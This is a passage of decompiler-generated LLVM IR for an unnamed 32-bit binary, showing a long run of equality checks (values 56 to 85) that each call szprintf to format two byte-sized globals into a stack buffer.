dec_label_pc_804a72c:                             ; preds = %dec_label_pc_804a6fc, %dec_label_pc_804a702
  %v12_804a72c = icmp eq i32 %v11_8049ca7, 56
  %v1_804a730 = icmp eq i1 %v12_804a72c, false
  br i1 %v1_804a730, label %dec_label_pc_804a75c, label %dec_label_pc_804a732

dec_label_pc_804a732:                             ; preds = %dec_label_pc_804a72c
  %v0_804a732 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a732 = zext i8 %v0_804a732 to i32
  store i32 %v1_804a732, i32* @edx, align 4
  %v0_804a73e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a73e = zext i8 %v0_804a73e to i32
  %v2_804a74d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a74d, i32* @ebx, align 4
  %v5_804a754 = call i32 @szprintf(i32 %v2_804a74d, i32 ptrtoint ([14 x i8]* @global_var_8057402.96 to i32), i32 %v1_804a73e, i32 %v1_804a732)
  br label %dec_label_pc_804a75c

dec_label_pc_804a75c:                             ; preds = %dec_label_pc_804a72c, %dec_label_pc_804a732
  %v12_804a75c = icmp eq i32 %v11_8049ca7, 57
  %v1_804a760 = icmp eq i1 %v12_804a75c, false
  br i1 %v1_804a760, label %dec_label_pc_804a78c, label %dec_label_pc_804a762

dec_label_pc_804a762:                             ; preds = %dec_label_pc_804a75c
  %v0_804a762 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a762 = zext i8 %v0_804a762 to i32
  store i32 %v1_804a762, i32* @edx, align 4
  %v0_804a76e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a76e = zext i8 %v0_804a76e to i32
  %v2_804a77d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a77d, i32* @ebx, align 4
  %v5_804a784 = call i32 @szprintf(i32 %v2_804a77d, i32 ptrtoint ([13 x i8]* @global_var_8057410.97 to i32), i32 %v1_804a76e, i32 %v1_804a762)
  br label %dec_label_pc_804a78c

dec_label_pc_804a78c:                             ; preds = %dec_label_pc_804a75c, %dec_label_pc_804a762
  %v12_804a78c = icmp eq i32 %v11_8049ca7, 58
  %v1_804a790 = icmp eq i1 %v12_804a78c, false
  br i1 %v1_804a790, label %dec_label_pc_804a7bc, label %dec_label_pc_804a792

dec_label_pc_804a792:                             ; preds = %dec_label_pc_804a78c
  %v0_804a792 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a792 = zext i8 %v0_804a792 to i32
  store i32 %v1_804a792, i32* @edx, align 4
  %v0_804a79e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a79e = zext i8 %v0_804a79e to i32
  %v2_804a7ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7ad, i32* @ebx, align 4
  %v5_804a7b4 = call i32 @szprintf(i32 %v2_804a7ad, i32 ptrtoint ([13 x i8]* @global_var_805741d.98 to i32), i32 %v1_804a79e, i32 %v1_804a792)
  br label %dec_label_pc_804a7bc

dec_label_pc_804a7bc:                             ; preds = %dec_label_pc_804a78c, %dec_label_pc_804a792
  %v12_804a7bc = icmp eq i32 %v11_8049ca7, 59
  %v1_804a7c0 = icmp eq i1 %v12_804a7bc, false
  br i1 %v1_804a7c0, label %dec_label_pc_804a7ec, label %dec_label_pc_804a7c2

dec_label_pc_804a7c2:                             ; preds = %dec_label_pc_804a7bc
  %v0_804a7c2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a7c2 = zext i8 %v0_804a7c2 to i32
  store i32 %v1_804a7c2, i32* @edx, align 4
  %v0_804a7ce = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a7ce = zext i8 %v0_804a7ce to i32
  %v2_804a7dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7dd, i32* @ebx, align 4
  %v5_804a7e4 = call i32 @szprintf(i32 %v2_804a7dd, i32 ptrtoint ([13 x i8]* @global_var_805742a.99 to i32), i32 %v1_804a7ce, i32 %v1_804a7c2)
  br label %dec_label_pc_804a7ec

dec_label_pc_804a7ec:                             ; preds = %dec_label_pc_804a7bc, %dec_label_pc_804a7c2
  %v12_804a7ec = icmp eq i32 %v11_8049ca7, 60
  %v1_804a7f0 = icmp eq i1 %v12_804a7ec, false
  br i1 %v1_804a7f0, label %dec_label_pc_804a81c, label %dec_label_pc_804a7f2

dec_label_pc_804a7f2:                             ; preds = %dec_label_pc_804a7ec
  %v0_804a7f2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a7f2 = zext i8 %v0_804a7f2 to i32
  store i32 %v1_804a7f2, i32* @edx, align 4
  %v0_804a7fe = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a7fe = zext i8 %v0_804a7fe to i32
  %v2_804a80d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a80d, i32* @ebx, align 4
  %v5_804a814 = call i32 @szprintf(i32 %v2_804a80d, i32 ptrtoint ([13 x i8]* @global_var_8057437.100 to i32), i32 %v1_804a7fe, i32 %v1_804a7f2)
  br label %dec_label_pc_804a81c

dec_label_pc_804a81c:                             ; preds = %dec_label_pc_804a7ec, %dec_label_pc_804a7f2
  %v12_804a81c = icmp eq i32 %v11_8049ca7, 61
  %v1_804a820 = icmp eq i1 %v12_804a81c, false
  br i1 %v1_804a820, label %dec_label_pc_804a84c, label %dec_label_pc_804a822

dec_label_pc_804a822:                             ; preds = %dec_label_pc_804a81c
  %v0_804a822 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a822 = zext i8 %v0_804a822 to i32
  store i32 %v1_804a822, i32* @edx, align 4
  %v0_804a82e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a82e = zext i8 %v0_804a82e to i32
  %v2_804a83d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a83d, i32* @ebx, align 4
  %v5_804a844 = call i32 @szprintf(i32 %v2_804a83d, i32 ptrtoint ([13 x i8]* @global_var_8057444.101 to i32), i32 %v1_804a82e, i32 %v1_804a822)
  br label %dec_label_pc_804a84c

dec_label_pc_804a84c:                             ; preds = %dec_label_pc_804a81c, %dec_label_pc_804a822
  %v12_804a84c = icmp eq i32 %v11_8049ca7, 62
  %v1_804a850 = icmp eq i1 %v12_804a84c, false
  br i1 %v1_804a850, label %dec_label_pc_804a87c, label %dec_label_pc_804a852

dec_label_pc_804a852:                             ; preds = %dec_label_pc_804a84c
  %v0_804a852 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a852 = zext i8 %v0_804a852 to i32
  store i32 %v1_804a852, i32* @edx, align 4
  %v0_804a85e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a85e = zext i8 %v0_804a85e to i32
  %v2_804a86d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a86d, i32* @ebx, align 4
  %v5_804a874 = call i32 @szprintf(i32 %v2_804a86d, i32 ptrtoint ([13 x i8]* @global_var_8057451.102 to i32), i32 %v1_804a85e, i32 %v1_804a852)
  br label %dec_label_pc_804a87c

dec_label_pc_804a87c:                             ; preds = %dec_label_pc_804a84c, %dec_label_pc_804a852
  %v12_804a87c = icmp eq i32 %v11_8049ca7, 63
  %v1_804a880 = icmp eq i1 %v12_804a87c, false
  br i1 %v1_804a880, label %dec_label_pc_804a8ac, label %dec_label_pc_804a882

dec_label_pc_804a882:                             ; preds = %dec_label_pc_804a87c
  %v0_804a882 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a882 = zext i8 %v0_804a882 to i32
  store i32 %v1_804a882, i32* @edx, align 4
  %v0_804a88e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a88e = zext i8 %v0_804a88e to i32
  %v2_804a89d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a89d, i32* @ebx, align 4
  %v5_804a8a4 = call i32 @szprintf(i32 %v2_804a89d, i32 ptrtoint ([13 x i8]* @global_var_805745e.103 to i32), i32 %v1_804a88e, i32 %v1_804a882)
  br label %dec_label_pc_804a8ac

dec_label_pc_804a8ac:                             ; preds = %dec_label_pc_804a87c, %dec_label_pc_804a882
  %v9_804a8ac = icmp eq i32 %v11_8049ca7, 64
  %v1_804a8b0 = icmp eq i1 %v9_804a8ac, false
  br i1 %v1_804a8b0, label %dec_label_pc_804a8dc, label %dec_label_pc_804a8b2

dec_label_pc_804a8b2:                             ; preds = %dec_label_pc_804a8ac
  %v0_804a8b2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a8b2 = zext i8 %v0_804a8b2 to i32
  store i32 %v1_804a8b2, i32* @edx, align 4
  %v0_804a8be = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a8be = zext i8 %v0_804a8be to i32
  %v2_804a8cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8cd, i32* @ebx, align 4
  %v5_804a8d4 = call i32 @szprintf(i32 %v2_804a8cd, i32 ptrtoint ([13 x i8]* @global_var_805746b.104 to i32), i32 %v1_804a8be, i32 %v1_804a8b2)
  br label %dec_label_pc_804a8dc

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8ac, %dec_label_pc_804a8b2
  %v12_804a8dc = icmp eq i32 %v11_8049ca7, 65
  %v1_804a8e0 = icmp eq i1 %v12_804a8dc, false
  br i1 %v1_804a8e0, label %dec_label_pc_804a90c, label %dec_label_pc_804a8e2

dec_label_pc_804a8e2:                             ; preds = %dec_label_pc_804a8dc
  %v0_804a8e2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a8e2 = zext i8 %v0_804a8e2 to i32
  store i32 %v1_804a8e2, i32* @edx, align 4
  %v0_804a8ee = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a8ee = zext i8 %v0_804a8ee to i32
  %v2_804a8fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8fd, i32* @ebx, align 4
  %v5_804a904 = call i32 @szprintf(i32 %v2_804a8fd, i32 ptrtoint ([13 x i8]* @global_var_8057478.105 to i32), i32 %v1_804a8ee, i32 %v1_804a8e2)
  br label %dec_label_pc_804a90c

dec_label_pc_804a90c:                             ; preds = %dec_label_pc_804a8dc, %dec_label_pc_804a8e2
  %v12_804a90c = icmp eq i32 %v11_8049ca7, 66
  %v1_804a910 = icmp eq i1 %v12_804a90c, false
  br i1 %v1_804a910, label %dec_label_pc_804a93c, label %dec_label_pc_804a912

dec_label_pc_804a912:                             ; preds = %dec_label_pc_804a90c
  %v0_804a912 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a912 = zext i8 %v0_804a912 to i32
  store i32 %v1_804a912, i32* @edx, align 4
  %v0_804a91e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a91e = zext i8 %v0_804a91e to i32
  %v2_804a92d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a92d, i32* @ebx, align 4
  %v5_804a934 = call i32 @szprintf(i32 %v2_804a92d, i32 ptrtoint ([13 x i8]* @global_var_8057485.106 to i32), i32 %v1_804a91e, i32 %v1_804a912)
  br label %dec_label_pc_804a93c

dec_label_pc_804a93c:                             ; preds = %dec_label_pc_804a90c, %dec_label_pc_804a912
  %v12_804a93c = icmp eq i32 %v11_8049ca7, 67
  %v1_804a940 = icmp eq i1 %v12_804a93c, false
  br i1 %v1_804a940, label %dec_label_pc_804a96c, label %dec_label_pc_804a942

dec_label_pc_804a942:                             ; preds = %dec_label_pc_804a93c
  %v0_804a942 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a942 = zext i8 %v0_804a942 to i32
  store i32 %v1_804a942, i32* @edx, align 4
  %v0_804a94e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a94e = zext i8 %v0_804a94e to i32
  %v2_804a95d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a95d, i32* @ebx, align 4
  %v5_804a964 = call i32 @szprintf(i32 %v2_804a95d, i32 ptrtoint ([13 x i8]* @global_var_8057492.107 to i32), i32 %v1_804a94e, i32 %v1_804a942)
  br label %dec_label_pc_804a96c

dec_label_pc_804a96c:                             ; preds = %dec_label_pc_804a93c, %dec_label_pc_804a942
  %v12_804a96c = icmp eq i32 %v11_8049ca7, 68
  %v1_804a970 = icmp eq i1 %v12_804a96c, false
  br i1 %v1_804a970, label %dec_label_pc_804a99c, label %dec_label_pc_804a972

dec_label_pc_804a972:                             ; preds = %dec_label_pc_804a96c
  %v0_804a972 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a972 = zext i8 %v0_804a972 to i32
  store i32 %v1_804a972, i32* @edx, align 4
  %v0_804a97e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a97e = zext i8 %v0_804a97e to i32
  %v2_804a98d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a98d, i32* @ebx, align 4
  %v5_804a994 = call i32 @szprintf(i32 %v2_804a98d, i32 ptrtoint ([13 x i8]* @global_var_805749f.108 to i32), i32 %v1_804a97e, i32 %v1_804a972)
  br label %dec_label_pc_804a99c

dec_label_pc_804a99c:                             ; preds = %dec_label_pc_804a96c, %dec_label_pc_804a972
  %v12_804a99c = icmp eq i32 %v11_8049ca7, 69
  %v1_804a9a0 = icmp eq i1 %v12_804a99c, false
  br i1 %v1_804a9a0, label %dec_label_pc_804a9cc, label %dec_label_pc_804a9a2

dec_label_pc_804a9a2:                             ; preds = %dec_label_pc_804a99c
  %v0_804a9a2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a9a2 = zext i8 %v0_804a9a2 to i32
  store i32 %v1_804a9a2, i32* @edx, align 4
  %v0_804a9ae = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a9ae = zext i8 %v0_804a9ae to i32
  %v2_804a9bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9bd, i32* @ebx, align 4
  %v5_804a9c4 = call i32 @szprintf(i32 %v2_804a9bd, i32 ptrtoint ([13 x i8]* @global_var_80574ac.109 to i32), i32 %v1_804a9ae, i32 %v1_804a9a2)
  br label %dec_label_pc_804a9cc

dec_label_pc_804a9cc:                             ; preds = %dec_label_pc_804a99c, %dec_label_pc_804a9a2
  %v12_804a9cc = icmp eq i32 %v11_8049ca7, 70
  %v1_804a9d0 = icmp eq i1 %v12_804a9cc, false
  br i1 %v1_804a9d0, label %dec_label_pc_804a9fc, label %dec_label_pc_804a9d2

dec_label_pc_804a9d2:                             ; preds = %dec_label_pc_804a9cc
  %v0_804a9d2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a9d2 = zext i8 %v0_804a9d2 to i32
  store i32 %v1_804a9d2, i32* @edx, align 4
  %v0_804a9de = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a9de = zext i8 %v0_804a9de to i32
  %v2_804a9ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9ed, i32* @ebx, align 4
  %v5_804a9f4 = call i32 @szprintf(i32 %v2_804a9ed, i32 ptrtoint ([13 x i8]* @global_var_80574b9.110 to i32), i32 %v1_804a9de, i32 %v1_804a9d2)
  br label %dec_label_pc_804a9fc

dec_label_pc_804a9fc:                             ; preds = %dec_label_pc_804a9cc, %dec_label_pc_804a9d2
  %v12_804a9fc = icmp eq i32 %v11_8049ca7, 71
  %v1_804aa00 = icmp eq i1 %v12_804a9fc, false
  br i1 %v1_804aa00, label %dec_label_pc_804aa2c, label %dec_label_pc_804aa02

dec_label_pc_804aa02:                             ; preds = %dec_label_pc_804a9fc
  %v0_804aa02 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aa02 = zext i8 %v0_804aa02 to i32
  store i32 %v1_804aa02, i32* @edx, align 4
  %v0_804aa0e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804aa0e = zext i8 %v0_804aa0e to i32
  %v2_804aa1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa1d, i32* @ebx, align 4
  %v5_804aa24 = call i32 @szprintf(i32 %v2_804aa1d, i32 ptrtoint ([13 x i8]* @global_var_80574c6.111 to i32), i32 %v1_804aa0e, i32 %v1_804aa02)
  br label %dec_label_pc_804aa2c

dec_label_pc_804aa2c:                             ; preds = %dec_label_pc_804a9fc, %dec_label_pc_804aa02
  %v12_804aa2c = icmp eq i32 %v11_8049ca7, 72
  %v1_804aa30 = icmp eq i1 %v12_804aa2c, false
  br i1 %v1_804aa30, label %dec_label_pc_804aa5c, label %dec_label_pc_804aa32

dec_label_pc_804aa32:                             ; preds = %dec_label_pc_804aa2c
  %v0_804aa32 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aa32 = zext i8 %v0_804aa32 to i32
  store i32 %v1_804aa32, i32* @edx, align 4
  %v0_804aa3e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804aa3e = zext i8 %v0_804aa3e to i32
  %v2_804aa4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa4d, i32* @ebx, align 4
  %v5_804aa54 = call i32 @szprintf(i32 %v2_804aa4d, i32 ptrtoint ([13 x i8]* @global_var_80574d3.112 to i32), i32 %v1_804aa3e, i32 %v1_804aa32)
  br label %dec_label_pc_804aa5c

dec_label_pc_804aa5c:                             ; preds = %dec_label_pc_804aa2c, %dec_label_pc_804aa32
  %v12_804aa5c = icmp eq i32 %v11_8049ca7, 73
  %v1_804aa60 = icmp eq i1 %v12_804aa5c, false
  br i1 %v1_804aa60, label %dec_label_pc_804aa8c, label %dec_label_pc_804aa62

dec_label_pc_804aa62:                             ; preds = %dec_label_pc_804aa5c
  %v0_804aa62 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aa62 = zext i8 %v0_804aa62 to i32
  store i32 %v1_804aa62, i32* @edx, align 4
  %v0_804aa6e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804aa6e = zext i8 %v0_804aa6e to i32
  %v2_804aa7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa7d, i32* @ebx, align 4
  %v5_804aa84 = call i32 @szprintf(i32 %v2_804aa7d, i32 ptrtoint ([13 x i8]* @global_var_80574e0.113 to i32), i32 %v1_804aa6e, i32 %v1_804aa62)
  br label %dec_label_pc_804aa8c

dec_label_pc_804aa8c:                             ; preds = %dec_label_pc_804aa5c, %dec_label_pc_804aa62
  %v12_804aa8c = icmp eq i32 %v11_8049ca7, 74
  %v1_804aa90 = icmp eq i1 %v12_804aa8c, false
  br i1 %v1_804aa90, label %dec_label_pc_804aabc, label %dec_label_pc_804aa92

dec_label_pc_804aa92:                             ; preds = %dec_label_pc_804aa8c
  %v0_804aa92 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aa92 = zext i8 %v0_804aa92 to i32
  store i32 %v1_804aa92, i32* @edx, align 4
  %v0_804aa9e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804aa9e = zext i8 %v0_804aa9e to i32
  %v2_804aaad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaad, i32* @ebx, align 4
  %v5_804aab4 = call i32 @szprintf(i32 %v2_804aaad, i32 ptrtoint ([13 x i8]* @global_var_80574ed.114 to i32), i32 %v1_804aa9e, i32 %v1_804aa92)
  br label %dec_label_pc_804aabc

dec_label_pc_804aabc:                             ; preds = %dec_label_pc_804aa8c, %dec_label_pc_804aa92
  %v12_804aabc = icmp eq i32 %v11_8049ca7, 75
  %v1_804aac0 = icmp eq i1 %v12_804aabc, false
  br i1 %v1_804aac0, label %dec_label_pc_804aaec, label %dec_label_pc_804aac2

dec_label_pc_804aac2:                             ; preds = %dec_label_pc_804aabc
  %v0_804aac2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aac2 = zext i8 %v0_804aac2 to i32
  store i32 %v1_804aac2, i32* @edx, align 4
  %v0_804aace = load i8, i8* @global_var_8061599.40, align 1
  %v1_804aace = zext i8 %v0_804aace to i32
  %v2_804aadd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aadd, i32* @ebx, align 4
  %v5_804aae4 = call i32 @szprintf(i32 %v2_804aadd, i32 ptrtoint ([13 x i8]* @global_var_80574fa.115 to i32), i32 %v1_804aace, i32 %v1_804aac2)
  br label %dec_label_pc_804aaec

dec_label_pc_804aaec:                             ; preds = %dec_label_pc_804aabc, %dec_label_pc_804aac2
  %v12_804aaec = icmp eq i32 %v11_8049ca7, 76
  %v1_804aaf0 = icmp eq i1 %v12_804aaec, false
  br i1 %v1_804aaf0, label %dec_label_pc_804ab1c, label %dec_label_pc_804aaf2

dec_label_pc_804aaf2:                             ; preds = %dec_label_pc_804aaec
  %v0_804aaf2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aaf2 = zext i8 %v0_804aaf2 to i32
  store i32 %v1_804aaf2, i32* @edx, align 4
  %v0_804aafe = load i8, i8* @global_var_8061599.40, align 1
  %v1_804aafe = zext i8 %v0_804aafe to i32
  %v2_804ab0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab0d, i32* @ebx, align 4
  %v5_804ab14 = call i32 @szprintf(i32 %v2_804ab0d, i32 ptrtoint ([13 x i8]* @global_var_8057507.116 to i32), i32 %v1_804aafe, i32 %v1_804aaf2)
  br label %dec_label_pc_804ab1c

dec_label_pc_804ab1c:                             ; preds = %dec_label_pc_804aaec, %dec_label_pc_804aaf2
  %v12_804ab1c = icmp eq i32 %v11_8049ca7, 77
  %v1_804ab20 = icmp eq i1 %v12_804ab1c, false
  br i1 %v1_804ab20, label %dec_label_pc_804ab4c, label %dec_label_pc_804ab22

dec_label_pc_804ab22:                             ; preds = %dec_label_pc_804ab1c
  %v0_804ab22 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ab22 = zext i8 %v0_804ab22 to i32
  store i32 %v1_804ab22, i32* @edx, align 4
  %v0_804ab2e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ab2e = zext i8 %v0_804ab2e to i32
  %v2_804ab3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab3d, i32* @ebx, align 4
  %v5_804ab44 = call i32 @szprintf(i32 %v2_804ab3d, i32 ptrtoint ([13 x i8]* @global_var_8057514.117 to i32), i32 %v1_804ab2e, i32 %v1_804ab22)
  br label %dec_label_pc_804ab4c

dec_label_pc_804ab4c:                             ; preds = %dec_label_pc_804ab1c, %dec_label_pc_804ab22
  %v12_804ab4c = icmp eq i32 %v11_8049ca7, 78
  %v1_804ab50 = icmp eq i1 %v12_804ab4c, false
  br i1 %v1_804ab50, label %dec_label_pc_804ab7c, label %dec_label_pc_804ab52

dec_label_pc_804ab52:                             ; preds = %dec_label_pc_804ab4c
  %v0_804ab52 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ab52 = zext i8 %v0_804ab52 to i32
  store i32 %v1_804ab52, i32* @edx, align 4
  %v0_804ab5e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ab5e = zext i8 %v0_804ab5e to i32
  %v2_804ab6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab6d, i32* @ebx, align 4
  %v5_804ab74 = call i32 @szprintf(i32 %v2_804ab6d, i32 ptrtoint ([13 x i8]* @global_var_8057521.118 to i32), i32 %v1_804ab5e, i32 %v1_804ab52)
  br label %dec_label_pc_804ab7c

dec_label_pc_804ab7c:                             ; preds = %dec_label_pc_804ab4c, %dec_label_pc_804ab52
  %v12_804ab7c = icmp eq i32 %v11_8049ca7, 79
  %v1_804ab80 = icmp eq i1 %v12_804ab7c, false
  br i1 %v1_804ab80, label %dec_label_pc_804abac, label %dec_label_pc_804ab82

dec_label_pc_804ab82:                             ; preds = %dec_label_pc_804ab7c
  %v0_804ab82 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ab82 = zext i8 %v0_804ab82 to i32
  store i32 %v1_804ab82, i32* @edx, align 4
  %v0_804ab8e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ab8e = zext i8 %v0_804ab8e to i32
  %v2_804ab9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab9d, i32* @ebx, align 4
  %v5_804aba4 = call i32 @szprintf(i32 %v2_804ab9d, i32 ptrtoint ([13 x i8]* @global_var_805752e.119 to i32), i32 %v1_804ab8e, i32 %v1_804ab82)
  br label %dec_label_pc_804abac

dec_label_pc_804abac:                             ; preds = %dec_label_pc_804ab7c, %dec_label_pc_804ab82
  %v9_804abac = icmp eq i32 %v11_8049ca7, 80
  %v1_804abb0 = icmp eq i1 %v9_804abac, false
  br i1 %v1_804abb0, label %dec_label_pc_804abdc, label %dec_label_pc_804abb2

dec_label_pc_804abb2:                             ; preds = %dec_label_pc_804abac
  %v0_804abb2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804abb2 = zext i8 %v0_804abb2 to i32
  store i32 %v1_804abb2, i32* @edx, align 4
  %v0_804abbe = load i8, i8* @global_var_8061599.40, align 1
  %v1_804abbe = zext i8 %v0_804abbe to i32
  %v2_804abcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abcd, i32* @ebx, align 4
  %v5_804abd4 = call i32 @szprintf(i32 %v2_804abcd, i32 ptrtoint ([13 x i8]* @global_var_805753b.120 to i32), i32 %v1_804abbe, i32 %v1_804abb2)
  br label %dec_label_pc_804abdc

dec_label_pc_804abdc:                             ; preds = %dec_label_pc_804abac, %dec_label_pc_804abb2
  %v12_804abdc = icmp eq i32 %v11_8049ca7, 81
  %v1_804abe0 = icmp eq i1 %v12_804abdc, false
  br i1 %v1_804abe0, label %dec_label_pc_804ac0c, label %dec_label_pc_804abe2

dec_label_pc_804abe2:                             ; preds = %dec_label_pc_804abdc
  %v0_804abe2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804abe2 = zext i8 %v0_804abe2 to i32
  store i32 %v1_804abe2, i32* @edx, align 4
  %v0_804abee = load i8, i8* @global_var_8061599.40, align 1
  %v1_804abee = zext i8 %v0_804abee to i32
  %v2_804abfd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abfd, i32* @ebx, align 4
  %v5_804ac04 = call i32 @szprintf(i32 %v2_804abfd, i32 ptrtoint ([13 x i8]* @global_var_8057548.121 to i32), i32 %v1_804abee, i32 %v1_804abe2)
  br label %dec_label_pc_804ac0c

dec_label_pc_804ac0c:                             ; preds = %dec_label_pc_804abdc, %dec_label_pc_804abe2
  %v12_804ac0c = icmp eq i32 %v11_8049ca7, 82
  %v1_804ac10 = icmp eq i1 %v12_804ac0c, false
  br i1 %v1_804ac10, label %dec_label_pc_804ac3c, label %dec_label_pc_804ac12

dec_label_pc_804ac12:                             ; preds = %dec_label_pc_804ac0c
  %v0_804ac12 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ac12 = zext i8 %v0_804ac12 to i32
  store i32 %v1_804ac12, i32* @edx, align 4
  %v0_804ac1e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ac1e = zext i8 %v0_804ac1e to i32
  %v2_804ac2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac2d, i32* @ebx, align 4
  %v5_804ac34 = call i32 @szprintf(i32 %v2_804ac2d, i32 ptrtoint ([13 x i8]* @global_var_8057555.122 to i32), i32 %v1_804ac1e, i32 %v1_804ac12)
  br label %dec_label_pc_804ac3c

dec_label_pc_804ac3c:                             ; preds = %dec_label_pc_804ac0c, %dec_label_pc_804ac12
  %v12_804ac3c = icmp eq i32 %v11_8049ca7, 83
  %v1_804ac40 = icmp eq i1 %v12_804ac3c, false
  br i1 %v1_804ac40, label %dec_label_pc_804ac6c, label %dec_label_pc_804ac42

dec_label_pc_804ac42:                             ; preds = %dec_label_pc_804ac3c
  %v0_804ac42 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ac42 = zext i8 %v0_804ac42 to i32
  store i32 %v1_804ac42, i32* @edx, align 4
  %v0_804ac4e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ac4e = zext i8 %v0_804ac4e to i32
  %v2_804ac5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac5d, i32* @ebx, align 4
  %v5_804ac64 = call i32 @szprintf(i32 %v2_804ac5d, i32 ptrtoint ([13 x i8]* @global_var_8057562.123 to i32), i32 %v1_804ac4e, i32 %v1_804ac42)
  br label %dec_label_pc_804ac6c

dec_label_pc_804ac6c:                             ; preds = %dec_label_pc_804ac3c, %dec_label_pc_804ac42
  %v12_804ac6c = icmp eq i32 %v11_8049ca7, 84
  %v1_804ac70 = icmp eq i1 %v12_804ac6c, false
  br i1 %v1_804ac70, label %dec_label_pc_804ac9c, label %dec_label_pc_804ac72

dec_label_pc_804ac72:                             ; preds = %dec_label_pc_804ac6c
  %v0_804ac72 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ac72 = zext i8 %v0_804ac72 to i32
  store i32 %v1_804ac72, i32* @edx, align 4
  %v0_804ac7e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ac7e = zext i8 %v0_804ac7e to i32
  %v2_804ac8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac8d, i32* @ebx, align 4
  %v5_804ac94 = call i32 @szprintf(i32 %v2_804ac8d, i32 ptrtoint ([13 x i8]* @global_var_805756f.124 to i32), i32 %v1_804ac7e, i32 %v1_804ac72)
  br label %dec_label_pc_804ac9c

dec_label_pc_804ac9c:                             ; preds = %dec_label_pc_804ac6c, %dec_label_pc_804ac72
  %v12_804ac9c = icmp eq i32 %v11_8049ca7, 85
  %v1_804aca0 = icmp eq i1 %v12_804ac9c, false
  br i1 %v1_804aca0, label %dec_label_pc_804accc, label %dec_label_pc_804aca2

dec_label_pc_804aca2:                             ; preds = %dec_label_pc_804ac9c
  %v0_804aca2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aca2 = zext i8 %v0_804aca2 to i32
  store i32 %v1_804aca2, i32* @edx, align 4
  %v0_804acae = load i8, i8* @global_var_8061599.40, align 1
  %v1_804acae = zext i8 %v0_804acae to i32
